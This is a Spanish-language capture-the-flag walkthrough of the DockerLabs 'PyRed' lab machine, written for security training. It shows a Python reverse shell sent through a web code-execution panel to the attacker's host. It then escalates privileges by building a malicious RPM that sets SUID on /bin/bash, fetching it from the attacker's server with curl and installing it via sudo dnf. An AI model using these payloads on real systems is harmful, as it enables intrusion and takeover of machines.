---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PyRed DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip pyred.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh pyred.tar
```

Info:

```
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 12:11 EST
Nmap scan report for asucar.dl (172.17.0.2)
Host is up (0.000030s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.12.2
|     Date: Thu, 12 Dec 2024 17:11:59 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1959
|     Connection: close
|     <style>
|     body {
|     background-color: #343a40; /* Color de fondo oscuro */
|     font-family: Arial, sans-serif;
|     color: #fff; /* Color del texto blanco */
|     .container {
|     width: 50%;
|     margin: auto;
|     text-align: center;
|     .header {
|     margin-bottom: 20px;
|     .form {
|     background-color: #495057; /* Color de fondo oscuro para el formulario */
|     padding: 20px;
|     border-radius: 10px;
|     box-shadow: 0 0 10px rgba(255, 255, 255, 0.1); /* Sombra tenue en el formulario */
|     textarea {
|     width: 100%;
|     padding: 10px;
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=12/12%Time=675B195F%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,856,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.2
SF:\x20Python/3\.12\.2\r\nDate:\x20Thu,\x2012\x20Dec\x202024\x2017:11:59\x
SF:20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length
SF::\x201959\r\nConnection:\x20close\r\n\r\n\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20
SF:{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x2
SF:0#343a40;\x20/\*\x20Color\x20de\x20fondo\x20oscuro\x20\*/\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-seri
SF:f;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\x20
SF:/\*\x20Color\x20del\x20texto\x20blanco\x20\*/\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2050%;\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20margin:\x20auto;\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20\.header\x20{\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2020px;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20\.form\x20{\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#
SF:495057;\x20/\*\x20Color\x20de\x20fondo\x20oscuro\x20para\x20el\x20formu
SF:lario\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\
SF:x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius
SF::\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:
SF:\x200\x200\x2010px\x20rgba\(255,\x20255,\x20255,\x200\.1\);\x20/\*\x20S
SF:ombra\x20tenue\x20en\x20el\x20formulario\x20\*/\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20textarea\x20{\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100%;\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20")%r(RTSPRequest,
SF:16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x
SF:20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>
SF:Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20cod
SF:e:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20re
SF:quest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20s
SF:yntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</
SF:html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.24 seconds
```

Vemos que hay como una especie de pagina en el puerto `5000`, en la que si nos metemos vemos una interfaz en la que aparentemente emula un panel en el que podemos poner codigo de `python` para "aprender" en la web.

Por lo que si ponemos lo siguiente:

```python
print("¡Hola, Mundo!")
```

Y nos aparecera el `output` como:

```
¡Hola, Mundo!
```

Vemos que funciona, ahora probaremos a buscar alguna vulnerabilidad, para ver si se ejecuta en la maquina victima:

```python
import getpass

# Obtener el nombre del usuario
usuario = getpass.getuser()
print(f"Hola, {usuario}. Bienvenido al script.")
```

Vemos que nos imprime lo siguiente:

```
Hola, primpi. Bienvenido al script.
```

Vemos que somos el usuario `primpi`, por lo que vamos a intentar a crearnos una `reverse shell`:

```python
import socket
import subprocess
import os

# Dirección IP y puerto del atacante
IP = "<IP>"  # Cambia por tu IP local o pública
PUERTO = <PORT>       # Cambia por el puerto que desees usar

# Crear el socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Conectarse al atacante
s.connect((IP, PUERTO))

# Redirigir entrada, salida y errores a la conexión
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Lanzar un shell remoto
subprocess.call(["/bin/bash", "-i"])
```

Si antes de enviarlo nos ponemos a la escucha:

```shell
nc -lvnp <PORT>
```

Y ahora lo enviamos, obtendremos una `reverse shell` una vez enviado el script:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 57762
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
[primpi@f4bf127f1128 /]$ whoami
whoami
primpi
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for primpi on f4bf127f1128:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User primpi may run the following commands on f4bf127f1128:
    (ALL) NOPASSWD: /usr/bin/dnf
```

Por lo que vemos podremos ejecutar el binario `dnf` como `root`, por lo que haremos lo siguiente:

Primero nos iremos a nuestra maquina atacante y crearemos el siguiente archvio, pero antes instalando las dependencias:

```shell
sudo apt install ruby-full build-essential -y
```

```shell
sudo gem install fpm
```

Una vez echo todo esto, crearemos el archivo malicioso:

```shell
TF=$(mktemp -d)                              
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```

Info:

```
Created package {:path=>"x-1.0-1.noarch.rpm"}
```

Por lo que se nos habra creado un archivo llamado `x-1.0-1.noarch.rpm`, este lo tendremos que transferir a la maquina victima de la siguiente forma:

```shell
python3 -m http.server 80
```

Una vez abierto un servidor de `python`, pondremos lo siguiente en la maquina victima para pasarnoslo:

```shell
cd tmp
curl -O http://<IP_ATTACKER>/x-1.0-1.noarch.rpm
```

Ahora lo ejecutamos de la siguiente forma:

```shell
sudo dnf install -y x-1.0-1.noarch.rpm
```

Info:

```
Last metadata expiration check: 0:28:07 ago on Thu Dec 12 17:31:06 2024.
Dependencies resolved.
================================================================================
 Package      Architecture      Version           Repository               Size
================================================================================
Installing:
 x            noarch            1.0-1             @commandline            6.1 k

Transaction Summary
================================================================================
Install  1 Package

Total size: 6.1 k
Installed size: 20  
Downloading Packages:
Running transaction check
Transaction check succeeded.
Running transaction test
Transaction test succeeded.
Running transaction
  Preparing        :                                                        1/1 
  Running scriptlet: x-1.0-1.noarch                                         1/1 
  Installing       : x-1.0-1.noarch                                         1/1 
  Verifying        : x-1.0-1.noarch                                         1/1 

Installed:
  x-1.0-1.noarch                                                                

Complete!
```

Si ahora vemos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1443376 Jan 22  2024 /bin/bash
```

Vemos que se cambiaron los permisos correctamente, por lo que haremos lo siguiente:

```shell
bash -p
```

Y con esto ya seremos `root`:

```
whoami
root
```
